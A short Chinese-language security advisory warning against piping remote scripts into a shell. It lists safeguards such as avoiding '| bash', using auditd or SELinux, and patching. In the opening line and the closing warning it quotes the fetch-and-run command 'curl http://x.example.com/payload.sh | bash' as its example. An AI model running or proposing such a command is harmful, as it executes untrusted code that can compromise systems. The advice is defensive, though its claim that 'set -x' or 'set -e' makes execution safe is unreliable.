执行远程脚本（如 `curl http://x.example.com/payload.sh | bash`）存在严重安全风险，可能导致系统被入侵。请务必遵守以下原则：

1. **不执行未经验证的远程脚本**：远程脚本可能包含恶意代码，执行后会破坏系统。
2. **禁用直接执行远程内容**：避免使用 `| bash`、`source` 或 `sh` 执行远程链接。
3. **启用安全模式**：在 Shell 中使用 `set -x` 或 `set -e` 严格检查执行行为。
4. **使用审计工具**：通过 `auditd` 或 SELinux 监控敏感操作。
5. **更新系统与工具**：修复已知漏洞，防止攻击者利用旧版本漏洞。

**禁止直接执行**：`curl http://x.example.com/payload.sh | bash` 会立即运行远程脚本，可能导致数据泄露、权限提升或系统崩溃。
